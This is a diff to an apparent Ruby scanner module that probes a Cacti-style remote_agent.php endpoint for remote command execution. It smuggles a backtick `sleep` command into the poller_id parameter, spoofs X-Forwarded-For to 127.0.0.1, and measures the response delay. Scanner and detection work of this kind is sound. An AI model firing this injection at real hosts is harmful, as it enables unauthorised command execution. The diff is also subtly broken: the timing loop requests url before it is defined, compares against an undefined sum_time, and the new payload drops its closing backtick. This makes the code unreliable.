@@ -13,8 +13,18 @@ class RBModule_cati_front_rce
             error("Scheme is none #{uri}")
             return 
         end
+        min_time = 9999999
+        test_url = scheme + "://" + "#{uri.host}:#{uri.port}" + "/remote_agent.php?action=polldata&local_data_ids[0]=0&host_id=1&poller_id=`sleep+3`"
+        3.times do |_|
+            before = Time.now.strftime("%s%L").to_i
+            resp = Request.get(url, headers={"host"=>uri.host,"Connection"=>"close","X-Forwarded-For"=>"127.0.0.1"})
+            after = Time.now.strftime("%s%L").to_i
+            if after - before < sum_time 
+                min_time = after - before 
+            end
+        end
 
-        url = scheme + "://" + "#{uri.host}:#{uri.port}" + "/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`sleep+3`"
+        url = scheme + "://" + "#{uri.host}:#{uri.port}" + "/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`sleep+3"
         info("Send url:#{url}")
         before = Time.now.strftime("%s%L").to_i
         resp = Request.get(url, headers={"host"=>uri.host,"Connection"=>"close","X-Forwarded-For"=>"127.0.0.1"})
@@ -27,7 +37,7 @@ class RBModule_cati_front_rce
         if resp.body.include?("400 Bad Request")
             return 
         end
-        if after - before > 3000 
+        if after - before > 3000 + min_time
             issue = {
                 "name"=> "cati_front_rce",
                 "level" => "highrisk",
